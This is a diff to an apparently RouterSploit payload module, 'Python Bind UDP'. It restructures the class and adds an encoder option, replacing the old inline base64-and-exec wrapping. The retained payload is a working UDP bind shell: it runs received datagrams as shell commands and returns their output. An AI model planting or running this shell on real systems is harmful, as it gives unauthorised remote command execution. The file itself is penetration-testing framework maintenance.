@@ -1,8 +1,13 @@
-from base64 import b64encode
-from routersploit.core.exploit.payloads import BindTCPPayloadMixin, GenericPayload
+from routersploit.core.exploit.option import OptString
+from routersploit.core.exploit.payloads import (
+    GenericPayload,
+    Architectures,
+    BindTCPPayloadMixin,
+)
+from routersploit.modules.encoders.python.base64 import Encoder
 
 
-class Exploit(BindTCPPayloadMixin, GenericPayload):
+class Payload(BindTCPPayloadMixin, GenericPayload):
     __info__ = {
         "name": "Python Bind UDP",
         "description": "Creates interactive udp bind shell by using python.",
@@ -12,8 +17,11 @@ class Exploit(BindTCPPayloadMixin, GenericPayload):
         ),
     }
 
+    architecture = Architectures.PYTHON
+    encoder = OptString(Encoder(), "Encoder")
+
     def generate(self):
-        payload = (
+        return (
             "from subprocess import Popen,PIPE\n" +
             "from socket import socket, AF_INET, SOCK_DGRAM\n" +
             "s=socket(AF_INET,SOCK_DGRAM)\n" +
@@ -23,6 +31,3 @@ class Exploit(BindTCPPayloadMixin, GenericPayload):
             "\tout=Popen(data,shell=True,stdout=PIPE,stderr=PIPE).communicate()\n" +
             "\ts.sendto(''.join([out[0],out[1]]),addr)\n"
         )
-
-        encoded_payload = str(b64encode(bytes(payload, "utf-8")), "utf-8")
-        return "exec('{}'.decode('base64'))".format(encoded_payload)
